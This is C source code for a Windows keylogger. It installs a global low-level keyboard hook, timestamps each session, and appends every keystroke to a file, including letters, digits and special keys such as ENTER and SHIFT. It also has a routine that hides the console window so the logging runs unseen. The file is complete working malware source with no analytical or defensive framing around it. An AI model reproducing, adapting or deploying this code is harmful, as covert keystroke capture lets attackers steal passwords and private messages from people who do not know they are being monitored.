#include <stdio.h>
#include <Windows.h>
#include <time.h>

#include "keyLogger.h"

#define MAX_TIME_STR_LEN 30

#define VK_A 0x41
#define VK_Z 0x5A

#define VK_0 0x30 
#define VK_9 0x39

HHOOK hKeyboardHook;

FILE* outFile;


void hideConsoleWindow(void)
{
    HWND hWnd = GetConsoleWindow();
    if (hWnd != NULL) {
        ShowWindow(hWnd, SW_HIDE);
    }
}


void logToOutFile(const char* format, ...) {
    va_list args;
    va_start(args, format);

    vfprintf_s(outFile, format, args);
    fflush(outFile);

    va_end(args);
}


void logCurrentTime(void)
{
    struct tm newtime;
    time_t now = time(0);
    localtime_s(&newtime, &now);

    char timeString[MAX_TIME_STR_LEN];
    asctime_s(timeString, sizeof timeString, &newtime);

    logToOutFile("\n\nStart logging at: %s", timeString);
}


const char *getSpecialKeyName(DWORD vkCode) {
    switch (vkCode) {
    case VK_SHIFT:
        return "SHIFT";
    case VK_CONTROL:
        return "CTRL";
    case VK_MENU:
        return "ALT";
    case VK_LWIN:
        return "LEFT WINDOWS";
    case VK_RWIN:
        return "RIGHT WINDOWS";
    case VK_CAPITAL:
        return "CAPS LOCK";
    case VK_NUMLOCK:
        return "NUM LOCK";
    case VK_SCROLL:
        return "SCROLL LOCK";
    case VK_ESCAPE:
        return "ESCAPE";
    case VK_TAB:
        return "TAB";
    case VK_RETURN:
        return "ENTER";
    case VK_BACK:
        return "BACKSPACE";
    case VK_SPACE:
        return "SPACE";
    case VK_PRIOR:
        return "PAGE UP";
    case VK_NEXT:
        return "PAGE DOWN";
    case VK_END:
        return "END";
    case VK_HOME:
        return "HOME";
    case VK_INSERT:
        return "INSERT";
    case VK_DELETE:
        return "DELETE";
    case VK_PAUSE:
        return "PAUSE";
    case VK_PRINT:
        return "PRINT SCREEN";
    case VK_SNAPSHOT:
        return "SNAPSHOT";
    case VK_LEFT:
        return "LEFT ARROW";
    case VK_UP:
        return "UP ARROW";
    case VK_RIGHT:
        return "RIGHT ARROW";
    case VK_DOWN:
        return "DOWN ARROW";

    default:
        return NULL; 
    }
}


const char getCharFromVKCode(DWORD vkCode) {
    if ((vkCode >= VK_A && vkCode <= VK_Z) ||
        (vkCode >= VK_0 && vkCode <= VK_9)) 
            return (char)vkCode;
    
    return '\0'; 
}


void logKey(const DWORD vkCode)
{
    char character = getCharFromVKCode(vkCode);
    if (character) {
        logToOutFile("%c", character);
        return;
    }

    const char* specialKeyName = getSpecialKeyName(vkCode);
    if (specialKeyName) {
        logToOutFile("[%s]", specialKeyName);
        return;
    }
    
    logToOutFile("[%u]", vkCode);
}


LRESULT CALLBACK keyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        KBDLLHOOKSTRUCT *kbStruct = (KBDLLHOOKSTRUCT*)lParam;

        if (wParam == WM_KEYDOWN) {
            DWORD vkCode = kbStruct->vkCode;
            logKey(vkCode);
        }
    }
    return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}


const HHOOK setHook(void)
{
    return SetWindowsHookEx(WH_KEYBOARD_LL, keyboardProc, GetModuleHandle(NULL), 0);
}


errno_t setupKeyLogger(const char* outFileName) {
    const errno_t fileErr = fopen_s(&outFile, outFileName, "a");
    if (fileErr) return 1; // Cannot open file!

    hKeyboardHook = setHook();
    if (hKeyboardHook == NULL) return 1; // Cannot set hook!

    return 0;
}


void startLogging(void)
{
    logCurrentTime();

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
}


errno_t logKeys(const char *outFileName)
{
    errno_t err = setupKeyLogger(outFileName);
    if (err) return err;

    startLogging();

    UnhookWindowsHookEx(hKeyboardHook); 
    fclose(outFile);

    return 0;
}